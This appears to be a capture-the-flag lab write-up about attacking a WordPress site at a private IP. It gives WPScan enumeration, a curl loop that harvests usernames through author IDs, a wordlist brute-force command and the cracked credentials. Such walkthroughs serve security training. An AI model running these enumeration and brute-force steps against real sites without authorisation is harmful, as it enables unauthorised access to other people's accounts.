PART 1 
Project Goal:
To assess the security of the WordPress site at http://10.10.89.207, gather information about its version, users, and attempt to brute-force a password using a wordlist.

Work Process and Used Code

Running WPScan to gather basic information
wpscan --url http://10.10.89.207 --enumerate u --disable-tls-checks
Result:

WordPress version 4.3.1 found

XML-RPC enabled

Theme: twentyfifteen

No users found

Finding username by author ID enumeration
Since WPScan did not reveal any users, I manually enumerated author IDs:

for i in {1..10}; do
  curl -s -L "http://10.10.89.207/?author=$i" | grep -oP '(?<=/author/)[^/"]+'
done
Result:
Found username — elliot

Downloading the dictionary file from the server
Found a dictionary file fsocity.dic on the server and downloaded it:

curl http://10.10.89.207/fsocity.dic -o fsocity.dic
Cleaning the dictionary from duplicates
Sorted and removed duplicates in the dictionary:

sort -u fsocity.dic -o fsocity_clean.dic
Brute-forcing the password for user elliot via WPScan
Used this command to brute-force the password with the wordlist:

wpscan --url http://10.10.89.207 \
  --usernames elliot \
  --passwords fsocity_clean.dic \
  --disable-tls-checks
Final Result:
Successfully cracked the password:

Username: elliot
Password: ER28-0652
Conclusion:
The site is running an outdated WordPress version vulnerable to XML-RPC attacks.

The username elliot was discovered by enumerating author IDs.

Using the dictionary fsocity.dic found on the server helped quickly brute-force the password.

The gathered data allows unauthorized access to the site.
